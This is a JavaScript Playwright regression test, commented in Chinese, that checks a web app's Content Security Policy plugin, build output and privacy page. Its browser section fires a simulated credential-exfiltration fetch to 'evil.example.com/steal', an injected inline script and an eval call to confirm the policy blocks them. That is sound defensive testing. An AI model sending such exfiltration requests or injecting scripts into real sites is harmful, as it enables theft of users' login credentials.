// 内容安全策略（CSP）与隐私说明页的回归测试。
//  A. 插件本身（不需要构建）：meta 放在 <meta charset> 之后；内联脚本按内容算哈希；script-src 没有 'unsafe-inline' / 'unsafe-eval'。
//  B. 构建产物：dist/index.html 有且只有一条 CSP，里面的哈希就是产物里那段兜底脚本的哈希；privacy.html 在产物和离线缓存清单里。
//  C. 浏览器（MOBILE_BROWSER=chromium|webkit）：在 CSP 下应用照常运行——
//     页面显示出来、兜底内联脚本没有被拦、真 Pyodide 跑出 Python 结果、Supabase 请求放行；
//     同时注入的内联脚本、eval、发往别的网站的请求都会被拦（证明 CSP 真的生效，不是摆设）。
// 运行：npm run build 之后 node tests/csp.test.mjs（不连真实 Supabase）
import { createHash } from "node:crypto";
import { existsSync, readFileSync } from "node:fs";
import { resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium, webkit } from "playwright";
import { injectCsp, inlineScriptHashes, buildCsp } from "../scripts/vite-csp-plugin.mjs";
import { startDistServer } from "./helpers/dist-server.mjs";

const DIST = resolve(process.env.DIST_DIR || fileURLToPath(new URL("../dist", import.meta.url)));
const BROWSER = process.env.MOBILE_BROWSER || "chromium";
const results = [];
const check = (name, ok, detail = "") => { results.push(!!ok); console.log(`${ok ? "✅" : "❌"} [${BROWSER}] ${name}${!ok && detail ? "  — " + detail : ""}`); };
const sha = (s) => "sha256-" + createHash("sha256").update(s, "utf8").digest("base64");
const cspOf = (html) => /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(html)?.[1] || "";
const directive = (csp, name) => csp.split(";").map((s) => s.trim()).find((s) => s.startsWith(name + " ")) || "";

// ---------- A. 插件 ----------
{
  const html = `<!doctype html><html><head>\n  <meta charset="utf-8" />\n  <title>t</title></head><body><script>var a = 1;</script><script type="module" src="./x.js"></script></body></html>`;
  const out = injectCsp(html);
  check("A meta 紧跟在 <meta charset> 后面（在任何脚本之前）", out.indexOf("Content-Security-Policy") > out.indexOf("charset") && out.indexOf("Content-Security-Policy") < out.indexOf("<script"));
  check("A 只给内联脚本算哈希，带 src 的不算", JSON.stringify(inlineScriptHashes(html)) === JSON.stringify([sha("var a = 1;")]));
  const csp = buildCsp(html), s = directive(csp, "script-src");
  check("A script-src 不含 'unsafe-inline' / 'unsafe-eval'，含 'wasm-unsafe-eval' 和内联脚本哈希", !/'unsafe-inline'|'unsafe-eval'/.test(s) && s.includes("'wasm-unsafe-eval'") && s.includes(sha("var a = 1;")), s);
  check("A object-src 'none'、base-uri 'self'、connect-src 只到本站和 *.supabase.co", /object-src 'none'/.test(csp) && /base-uri 'self'/.test(csp) && directive(csp, "connect-src") === "connect-src 'self' https://*.supabase.co", csp);
  let threw = false; try { injectCsp(out); } catch { threw = true; }
  check("A 已有 CSP 时拒绝再加一条（不会出现两条互相叠加的策略）", threw);
  const changed = html.replace("var a = 1;", "var a = 2;");
  check("A 内联脚本改了，哈希跟着变", buildCsp(changed) !== csp);
}

// ---------- B. 构建产物 ----------
if (!existsSync(DIST + "/index.html")) { console.log("环境失败：没有 dist/，先 npm run build"); process.exit(2); }
const indexHtml = readFileSync(DIST + "/index.html", "utf8");
const CSP = cspOf(indexHtml);
{
  check("B dist/index.html 有且只有一条 CSP meta", (indexHtml.match(/Content-Security-Policy/g) || []).length === 1 && !!CSP);
  const inline = [...indexHtml.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)].filter((m) => !/\bsrc\s*=/.test(m[1])).map((m) => sha(m[2]));
  check("B 产物里每段内联脚本的哈希都在 script-src 里", inline.length >= 1 && inline.every((h) => directive(CSP, "script-src").includes(h)), JSON.stringify(inline));
  check("B privacy.html 在产物里，并进了离线缓存清单", existsSync(DIST + "/privacy.html") && readFileSync(DIST + "/sw.js", "utf8").includes("./privacy.html"));
  const lab = existsSync(DIST + "/lab.html") ? readFileSync(DIST + "/lab.html", "utf8") : "";
  check("B 技术验证页 lab.html 不加 CSP（只给正式应用页加）", !lab.includes("Content-Security-Policy"));
}

// ---------- C. 浏览器 ----------
let browser, server;
try {
  try { browser = await (BROWSER === "webkit" ? webkit : chromium).launch(); } catch (e) { console.log("环境失败：浏览器启动失败 " + String(e.message).split("\n")[0]); process.exit(2); }
  server = await startDistServer({ dist: DIST });
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, serviceWorkers: "block" });
  // 记录所有 CSP 拦截事件（页面脚本运行之前就开始记）
  await ctx.addInitScript(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push({ d: e.effectiveDirective || e.violatedDirective, u: String(e.blockedURI || ""), s: String(e.sample || "").slice(0, 40) }));
  });
  // 假 Supabase：只看请求能不能发出去（被 CSP 拦下的请求根本到不了这里）
  let supabaseHits = 0;
  await ctx.route("https://x.supabase.co/**", (route) => { supabaseHits++; return route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*", "content-type": "application/json" }, body: "{}" }); });
  let evilHits = 0;
  await ctx.route("https://evil.example.com/**", (route) => { evilHits++; return route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*" }, body: "x" }); });
  const page = await ctx.newPage();
  const errors = []; page.on("pageerror", (e) => errors.push(String(e.message || e)));
  await page.goto(server.base, { waitUntil: "domcontentloaded" });
  await page.waitForFunction(() => window.__app && window.__app.getState, null, { timeout: 30000 });
  check("C 在 CSP 下应用正常显示（开场介绍或地图）", (await page.locator(".onboard, .statsbar").count()) > 0);

  // 真 Pyodide：在 Worker 里编译 WebAssembly 并运行
  const py = await page.evaluate(() => new Promise((done) => {
    const r = window.__app.runner;
    const go = () => {
      let out = "";
      const prevOut = r.onOutput, prevStatus = r.onStatus;
      r.onOutput = (t) => { out += t; };
      r.onStatus = (s, info) => { if (s === "done") { r.onOutput = prevOut; r.onStatus = prevStatus; done({ out, error: info && info.error }); } };
      if (!r.run("print(6 * 7)")) done({ out: "", error: "runner not ready: " + r.state });
    };
    if (r.state !== "ready" && typeof r.boot === "function" && r.state !== "loading") r.boot();
    r.whenReady(90000).then((s) => (s === "ready" ? go() : done({ out: "", error: s })));
  }));
  check("C 在 CSP 下真 Pyodide 能运行 Python（print(6 * 7) → 42）", /42/.test(py.out) && !py.error, JSON.stringify(py));

  const sb = await page.evaluate(() => fetch("https://x.supabase.co/auth/v1/health").then((r) => r.status, (e) => "blocked:" + e.message));
  check("C 发往 *.supabase.co 的请求放行", sb === 200 && supabaseHits >= 1, String(sb));

  // 不在 Playwright 自动化里正常发生、但攻击者会做的三件事：都必须被拦
  const before = await page.evaluate(() => window.__csp.length);
  const evil = await page.evaluate(() => fetch("https://evil.example.com/steal").then(() => "sent", () => "blocked"));
  check("C 发往别的网站的请求被拦（偷到的登录凭证发不出去）", evil === "blocked" && evilHits === 0, evil);
  const injected = await page.evaluate(() => new Promise((ok) => { const s = document.createElement("script"); s.textContent = "window.__pwned = 1"; document.body.append(s); setTimeout(() => ok(window.__pwned === 1), 100); }));
  check("C 被注入的内联脚本不执行", injected === false);
  const ev = await page.evaluate(() => { try { return eval("1 + 1"); } catch { return "blocked"; } });
  check("C eval 被拦", ev === "blocked", String(ev));
  const all = await page.evaluate(() => window.__csp);
  const early = all.slice(0, before);
  check("C 应用自身运行时没有任何 CSP 拦截（兜底内联脚本、样式、Worker、WASM、图标都没被拦）", early.length === 0, JSON.stringify(early));
  check("C 刚才故意触发的拦截确实留下了记录（说明上面的“0 次”不是因为没监听到）", all.length > before, JSON.stringify(all.slice(before)));
  check("C 没有页面脚本错误", errors.length === 0, JSON.stringify(errors));

  // 隐私说明：从“我的”页能打开；页面本身不需要脚本
  await page.evaluate(() => { const st = window.__app.getState(); st.onboarded = true; window.__app.persist(); window.__app.renderPath(); });
  await page.getByRole("button", { name: "我的" }).tap();
  const link = page.locator(".me-foot [data-privacy-link]");
  check("C “我的”页底部有“隐私说明”链接，点按区域至少 44 高", (await link.count()) === 1 && ((await link.boundingBox())?.height ?? 0) >= 44);
  const p2 = await ctx.newPage();
  await p2.goto(server.base + "privacy.html");
  const txt = await p2.locator("main").innerText();
  check("C 隐私说明页能打开，写明收集什么、谁处理、怎么删除", /隐私说明/.test(txt) && /邮箱地址/.test(txt) && /Supabase/.test(txt) && /删除账号/.test(txt) && /没有使用任何统计、广告或追踪代码/.test(txt));
  const pv = await p2.evaluate(() => window.__csp);
  check("C 隐私说明页没有 CSP 拦截", pv.length === 0, JSON.stringify(pv));
  await ctx.close();
} catch (e) {
  check("CSP 测试异常", false, String(e.stack || e).split("\n").slice(0, 4).join(" | "));
} finally {
  try { await browser?.close(); } catch {}
  try { await server?.close(); } catch {}
}
const failed = results.filter((r) => !r).length;
console.log(`\nCSP：共 ${results.length} 项，失败 ${failed} 项`);
process.exit(failed ? 1 : 0);
